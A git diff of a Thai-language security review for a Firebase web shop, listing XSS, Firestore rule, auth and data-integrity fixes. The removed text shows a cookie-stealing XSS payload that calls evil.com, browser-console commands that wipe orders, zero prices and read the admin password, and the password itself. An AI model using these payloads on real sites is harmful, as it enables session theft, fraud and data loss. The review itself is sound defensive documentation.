@@ -1,186 +1,131 @@
-# Security & Code Review - PEERAPONG SHOP
+# Security & Code Review — PEERAPONG SHOP
 
-Review date: 2026-03-28
-
----
-
-## สรุปสิ่งที่แก้ไข (Fixed)
+รีวิวครั้งที่ 2 (2026-03-28) — แก้ไขทั้งหมดแล้ว
 
 ---
 
-### XSS (Cross-Site Scripting) — 7 จุด
+## 1. Authentication & Authorization
 
-ปัญหารวม: ข้อมูลจาก Firestore ถูก render เป็น HTML โดยตรง ไม่ผ่าน `escapeHtml()` ทำให้ถ้ามีคนใส่ `<script>` หรือ `<img onerror=...>` ใน field ต่างๆ จะรัน JavaScript ในเบราว์เซอร์ของผู้ใช้คนอื่นได้
+| ปัญหา | ก่อนแก้ | หลังแก้ |
+|--------|---------|---------|
+| Admin password เก็บใน Firestore อ่านได้จาก client | `db.collection('settings').doc('admin').get()` → เห็น password เลย | ใช้ **Firebase Authentication** (email/password) — ไม่มี password ใน Firestore |
+| sessionStorage bypass | พิมพ์ `sessionStorage.setItem('adminAuth','true')` = เข้า admin | ใช้ `auth.onAuthStateChanged()` ตรวจ token จาก Firebase Auth |
+| Firestore rules เปิด write ทั้งหมด | `allow write: if true` ทุก collection | items write = auth only (ลูกค้าหัก stock ลงได้อย่างเดียว), settings = auth only, orders update = auth only |
 
-| #   | ตำแหน่ง                          | field ที่มีปัญหา                | แก้ยังไง                                |
-| --- | -------------------------------- | ------------------------------- | --------------------------------------- |
-| 1   | `js/shop.js` — renderCart        | `item.name`                     | `${escapeHtml(item.name)}`              |
-| 2   | `js/shop.js` — openSummaryModal  | `item.name`                     | `${escapeHtml(item.name)}`              |
-| 3   | `js/shop.js` — searchHistory     | `i.name`                        | `${escapeHtml(i.name)}`                 |
-| 4   | `js/shop.js` — searchHistory     | `order.status` (fallback)       | `escapeHtml(order.status)`              |
-| 5   | `js/admin.js` — openStockHistory | `h.addedBy`                     | `${escapeHtml(h.addedBy)}`              |
-| 6   | `js/shop.js`, `js/admin.js`      | `item.name` ใน `alt=""`         | `alt="${escapeHtml(item.name)}"`        |
-| 7   | `js/admin.js` — loadProducts     | `item.name` ใน inline `onclick` | เปลี่ยนเป็น `data-*` + event delegation |
-
-แ
-**ตัวอย่างถ้าไม่แก้:**
-
-```
-ชื่อสินค้าใน Firestore: <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
-
-→ ลูกค้าเปิดหน้าเว็บ → script ทำงาน → ขโมย cookie/session ไปเว็บ hacker
-→ ถ้าเป็น admin → hacker ได้สิทธิ์จัดการร้านทั้งหมด
-```
-
-**ตัวอย่างหลังแก้:**
-
-```
-ชื่อเดียวกันจะแสดงเป็นข้อความธรรมดา:
-&lt;img src=x onerror=&quot;fetch(...)&quot;&gt;
-
-→ ไม่รัน script → ปลอดภัย
-```
+### สิ่งที่ต้องทำใน Firebase Console:
+1. เปิด Authentication > Sign-in method > Email/Password
+2. สร้าง admin user ใน Authentication > Users
 
 ---
 
-### Firestore Rules — 3 จุด
+## 2. XSS Prevention
 
-| #   | ปัญหา                                  | ถ้าไม่แก้                           | แก้ยังไง                                                |
-| --- | -------------------------------------- | ----------------------------------- | ------------------------------------------------------- |
-| 8   | order status ไม่ validate ค่า          | ใส่ XSS payload ใน status field ได้ | เพิ่ม `status in ['pending', 'completed', 'cancelled']` |
-| 9   | `allow delete: if true` บน orders      | ใครก็ลบ order ได้จาก console        | เปลี่ยนเป็น `allow delete: if false`                    |
-| 10  | ไม่จำกัดความยาว facebook/characterName | ใส่ string 10MB → database บวม      | เพิ่ม `.size() <= 100`                                  |
-
-**ตัวอย่างถ้าไม่แก้ (ข้อ 9):**
-
-```javascript
-// hacker เปิด browser console แล้วพิมพ์
-db.collection("orders")
-  .get()
-  .then((s) => s.forEach((d) => d.ref.delete()));
-// → order ทุกรายการถูกลบหมด!
-```
-
-**หลังแก้:** Firestore reject คำสั่ง delete → `Error: PERMISSION_DENIED`
+| ปัญหา | ก่อนแก้ | หลังแก้ |
+|--------|---------|---------|
+| `escapeHtml()` ไม่ escape single quote `'` | `onclick="fn('${escapeHtml(val)}')"` → XSS ด้วย `');alert(1);//` | เพิ่ม `.replace(/'/g, '&#39;')` |
+| Inline onclick ใน order cards | `onclick="updateOrderStatus('${doc.id}', this.value)"` | ใช้ **event delegation** + `data-*` attributes ทั้งหมด |
+| Inline onclick ใน cart buttons | `onclick="changeCartQty('${id}', -1)"` | ใช้ event delegation + `data-cart-action` |
+| Inline onclick ใน item grid | `onclick="openItemModal('${item.id}')"` | ใช้ event delegation บน `#itemGrid` |
+| `onerror` infinite loop | `onerror="this.src='...'"` วนซ้ำถ้า fallback fail | เพิ่ม `this.onerror=null` ก่อน set src |
 
 ---
 
-### Error Handling — 3 จุด
+## 3. Race Conditions & Data Integrity
 
-| #   | ปัญหา                               | ถ้าไม่แก้                                      | แก้ยังไง                                        |
-| --- | ----------------------------------- | ---------------------------------------------- | ----------------------------------------------- |
-| 11  | `escapeHtml(null)` แสดง "undefined" | field หายจาก Firestore → เห็นคำว่า "undefined" | เพิ่ม `if (str == null) return ''`              |
-| 12  | qty +/- ไม่ check `currentItem`     | กดปุ่มตอน modal ปิด → JS crash                 | เพิ่ม `if (!currentItem) return;`               |
-| 13  | `order.items.map()` ไม่ check Array | document เสียหาย → crash ทั้งหน้า              | `Array.isArray(order.items) ? order.items : []` |
-
-**ตัวอย่างถ้าไม่แก้ (ข้อ 13):**
-
-```
-order document ใน Firestore ถ้า items field หายไป:
-→ TypeError: Cannot read properties of undefined (reading 'map')
-→ Order Board ทั้งหน้าไม่แสดงเลย แม้ order อื่นปกติ
-```
-
-**หลังแก้:** ข้าม order ที่ items เสียหาย แสดง order อื่นได้ปกติ
+| ปัญหา | ก่อนแก้ | หลังแก้ |
+|--------|---------|---------|
+| Cancel order คืน stock 2 เท่า | 2 admin กด cancel พร้อมกัน → read-then-batch = stock คืนซ้ำ | ใช้ **Firestore transaction** อ่าน + เขียนใน atomic operation |
+| ราคาจาก client ไม่ตรง server | `item.price` จาก cart object → แก้ใน console = สั่งราคา 0 | Transaction **อ่านราคาจาก Firestore** แล้วคำนวณ totalPrice ใหม่ |
+| Un-cancel ไม่เช็ค stock | เปลี่ยนจากยกเลิกกลับ → หัก stock โดยไม่เช็คว่ามีพอ | Transaction เช็ค stock ก่อนหัก ถ้าไม่พอ throw error |
+| Duplicate onSnapshot listeners | `loadOrders()` สร้าง listener ใหม่ทุกครั้ง → memory leak | เก็บ `unsubOrders` แล้ว unsubscribe ก่อนสร้างใหม่ |
 
 ---
 
-### Input Validation — 1 จุด
+## 4. Anti-Spam (ฝั่งลูกค้า)
 
-| #   | ปัญหา                 | ถ้าไม่แก้                              | แก้ยังไง                            |
-| --- | --------------------- | -------------------------------------- | ----------------------------------- |
-| 14  | ไม่จำกัดความยาว input | ใส่ 10MB → Firestore เก็บ → render ช้า | จำกัด 100 ตัวอักษร (client + rules) |
-
----
-
-### Data Integrity — 1 จุด
-
-| #   | ปัญหา                               | ถ้าไม่แก้                                     | แก้ยังไง                    |
-| --- | ----------------------------------- | --------------------------------------------- | --------------------------- |
-| 15  | เพิ่ม stock กับ stockHistory แยกกัน | write ที่ 2 fail → stock เพิ่มแต่ไม่มีประวัติ | ใช้ `db.batch()` ทำพร้อมกัน |
-
-**ตัวอย่างถ้าไม่แก้:**
-
-```
-เพิ่ม stock 10 ชิ้น → stock +10 สำเร็จ
-→ internet หลุดตอน write ประวัติ → ไม่มี record ว่าใครเพิ่ม
-→ ตรวจสอบย้อนหลังไม่ได้
-```
-
-**หลังแก้:** ถ้า write อันไหน fail → ทั้ง 2 อัน rollback → ข้อมูลตรงกันเสมอ
+| มาตรการ | รายละเอียด | ข้อจำกัด |
+|---------|-----------|----------|
+| Honeypot | ช่อง hidden ที่ bot กรอก → สั่งไม่สำเร็จ | Smart bot ข้ามได้ |
+| Cooldown 3 นาที | `localStorage` — สั่งซ้ำเร็วไม่ได้ | Incognito/clear storage bypass ได้ |
+| Captcha 4 หลัก | Random number ต้องพิมพ์ให้ตรง | Bot อ่าน DOM ได้ (ไม่ใช่ image captcha) |
+| Blocklist | โหลดจาก `settings/spam` — FB ที่โดน BAN สั่งไม่ได้ | Server-side enforced via rules |
+| Duplicate pending check | มี order pending = สั่งซ้ำไม่ได้ | TOCTOU race (best-effort) |
+| Field validation | FB >= 3, charName >= 2, max 100 | ทั้ง client + Firestore rules |
+| Firestore rules | `_hp == ''`, field types, sizes, status == 'pending' | Server-side enforced |
 
 ---
 
-### Cache & Hosting — 2 จุด
+## 5. Firestore Rules (ก่อน vs หลัง)
 
-| #   | ปัญหา                                          | ถ้าไม่แก้                                 | แก้ยังไง                                |
-| --- | ---------------------------------------------- | ----------------------------------------- | --------------------------------------- |
-| 16  | `style.css`, `modal-alert.js` ไม่มี `?v=`      | deploy ใหม่แต่ลูกค้าเห็น version เก่า     | เพิ่ม `?v=3` ทุกไฟล์                    |
-| 17  | `firestore.rules`, `test-order.html` ถูก serve | ใครก็เปิดดู rules / ลบ order ผ่าน URL ได้ | เพิ่มใน `ignore` list ของ firebase.json |
-
-**ตัวอย่างถ้าไม่แก้ (ข้อ 17):**
-
+### ก่อนแก้:
 ```
-เปิด https://yoursite.com/firestore.rules
-→ เห็น security rules ทั้งหมด → รู้ว่า items เปิด write → โจมตีได้ง่ายขึ้น
-
-เปิด https://yoursite.com/clear-orders.html
-→ ลบ order ทั้งหมดได้เลย
+items:    allow write: if true          ← ใครก็แก้ได้
+settings: allow write: if true          ← ใครก็แก้ password ได้
+orders:   allow update: if status valid  ← ใครก็เปลี่ยนสถานะได้
 ```
+
+### หลังแก้:
+```
+items:    allow create/delete: if isAdmin()
+          allow update: if isAdmin() OR (แก้แค่ field stock && stock >= 0)
+settings: allow write: if isAdmin()
+orders:   allow create: if validation ครบ (ลูกค้า)
+          allow update: if isAdmin() OR (ลูกค้าเปลี่ยน pending → cancelled เท่านั้น)
+          allow delete: if false
+stockHistory: allow create: if isAdmin()
+```
+
+`isAdmin()` = `request.auth.uid == 'TUts68ApuzUR5Z6qLunSWvvJSIJ2'`
 
 ---
 
-## ยังไม่ได้แก้ (ต้อง Firebase Authentication)
+## 6. File & Deployment Security
 
-ปัญหาเหล่านี้เป็นระดับ architecture — ต้องเพิ่มระบบ login จริงถึงจะแก้ได้
-
-### Authentication & Authorization
-
-| #   | ปัญหา                                | ความเสี่ยง                                                | วิธีแก้                                  |
-| --- | ------------------------------------ | --------------------------------------------------------- | ---------------------------------------- |
-| A   | Items `allow write: if true`         | ใครก็แก้ราคา/ลบสินค้า/ใส่ XSS ได้                         | Firebase Auth — เฉพาะ admin เขียนได้     |
-| B   | Admin password อ่านได้จาก client     | `db.collection('settings').doc('admin').get()` → ได้รหัส  | ใช้ Firebase Auth แทน Firestore password |
-| C   | sessionStorage bypass                | `sessionStorage.setItem('adminAuth','true')` → เข้า admin | ใช้ Firebase Auth token                  |
-| D   | stockHistory `allow create: if true` | สร้าง fake stock history ได้                              | ต้องรอ Firebase Auth                     |
-
-### Privacy & Rate Limiting
-
-| #   | ปัญหา                        | ความเสี่ยง                        | วิธีแก้                      |
-| --- | ---------------------------- | --------------------------------- | ---------------------------- |
-| E   | Orders `allow read: if true` | query ดูข้อมูลลูกค้าทุกคนได้      | จำกัด read ตาม field/auth    |
-| F   | ไม่มี rate limiting          | ส่ง order ซ้ำไม่จำกัด → stock หมด | Cloud Functions + rate limit |
-
-**ตัวอย่าง attack (ข้อ A):**
-
-```javascript
-// hacker เปิด console หน้าเว็บ
-db.collection("items").doc("xxx").update({ price: 0, stock: 99999 });
-// → สินค้าราคา 0 บาท stock 99999 → สั่งฟรีได้ไม่จำกัด
-```
-
-**ตัวอย่าง attack (ข้อ B):**
-
-```javascript
-db.collection("settings")
-  .doc("admin")
-  .get()
-  .then((d) => console.log(d.data().password));
-// → "peerapong" ← ได้รหัส admin เลย
-```
+| ปัญหา | ก่อนแก้ | หลังแก้ |
+|--------|---------|---------|
+| `public: "."` deploy ทั้ง root | อาจ expose ไฟล์ที่ไม่ต้องการ | เพิ่ม ignore: REVIEW.md, MEMORY.md, package.json |
+| test-order.html deploy ขึ้น prod | อยู่ใน prod | เพิ่มใน ignore list |
+| Catch-all rewrite | ทุก URL → index.html (ไม่มี 404) | ลบ rewrite ออก |
+| firebase-config.js ไม่มี cache-bust | เปลี่ยน config แล้ว browser cache | เพิ่ม `?v=5` |
+| Image upload ไม่จำกัดขนาด | Upload 50MB → Firestore 1MB limit crash | จำกัด **2MB** ก่อน process |
 
 ---
 
-## สรุปภาพรวม
+## 7. Code Quality & UX
 
-| หมวด             | แก้แล้ว | รอ Auth | รวม |
-| ---------------- | ------- | ------- | --- |
-| XSS              | 7       | —       | 7   |
-| Firestore Rules  | 3       | 2       | 5   |
-| Error Handling   | 3       | —       | 3   |
-| Input Validation | 1       | —       | 1   |
-| Data Integrity   | 1       | —       | 1   |
-| Cache & Hosting  | 2       | —       | 2   |
-| Auth & Privacy   | —       | 4       | 4   |
+| ปัญหา | ก่อนแก้ | หลังแก้ |
+|--------|---------|---------|
+| ไม่มี loading state | Grid ว่างเปล่าตอนโหลด | แสดง "กำลังโหลดสินค้า..." |
+| `parseInt` ไม่มี radix | `parseInt(value)` → อาจ parse ผิด | `parseInt(value, 10)` ทุกที่ |
+| History search ไม่มี debounce | Spam ปุ่มได้ไม่จำกัด | เพิ่ม debounce 500ms |
+| Modal ไม่มี Escape key | ปิดได้แค่กดปุ่มหรือ overlay | เพิ่ม Escape key handler |
+| `<label>` ไม่มี `for` | กดที่ label ไม่ focus input | เพิ่ม `for` attribute ทุก label |
+| ไม่มี `aria-label` | ปุ่ม +/- ไม่มี label สำหรับ screen reader | เพิ่ม aria-label |
+| Add product ไม่ atomic | `add()` แล้ว `add()` stockHistory แยก → อาจ fail ครึ่งเดียว | ใช้ batch write เป็น atomic |
+| Delete product ไม่ลบ subcollection | stockHistory กลายเป็น orphan data | ลบ stockHistory ก่อนลบ item |
+| Batch > 500 ใน blockFacebook | BAN คนที่มี order เยอะ → batch fail | แบ่ง chunk ทีละ 499 ops |
+| Number type safety | `item.price`, `item.stock` ไม่เช็ค type | ใช้ `Number() || 0` ทุกที่ที่ render |
 
-**แก้ไปแล้ว 17 จุด** — XSS ทั้งหมด, error handling, cache, rules validation, atomic writes
-**รอ Firebase Auth 6 จุด** — ต้องเพิ่มระบบ authentication ถึงจะปิดช่องโหว่ได้
+---
+
+## 8. ข้อจำกัดที่ยังมี (Known Limitations)
+
+| รายการ | เหตุผล |
+|--------|--------|
+| Orders `allow read: if true` | ลูกค้าต้องดูประวัติตัวเอง แต่ไม่มี auth ฝั่งลูกค้า → ใครก็ query ได้ |
+| Captcha เป็น plain text | ไม่ใช่ image captcha → bot อ่าน DOM ได้ ต้องใช้ reCAPTCHA ถ้าจะป้อง bot จริงจัง |
+| Cooldown แค่ localStorage | Bypass ได้ด้วย incognito — ต้องทำ server-side rate limit (Cloud Functions) |
+| hasPendingOrder อยู่นอก transaction | Firestore transaction ไม่รองรับ query → เป็น best-effort check |
+| Global variables | `items`, `cart` อยู่บน window scope → แก้ได้จาก console (แต่ rules ป้องกันแล้ว) |
+| ไม่มี pagination | Order/product โหลดทั้งหมด — ถ้าข้อมูลเยอะจะช้า |
+
+---
+
+## สรุป
+
+| ความรุนแรง | แก้แล้ว | เหลือ (known) |
+|------------|---------|---------------|
+| Critical | 4/4 | 0 |
+| High | 6/6 | 0 |
+| Medium | 7/7 | 4 (ต้อง Cloud Functions / reCAPTCHA) |
+| Low | 9/9 | 2 (pagination, global vars) |
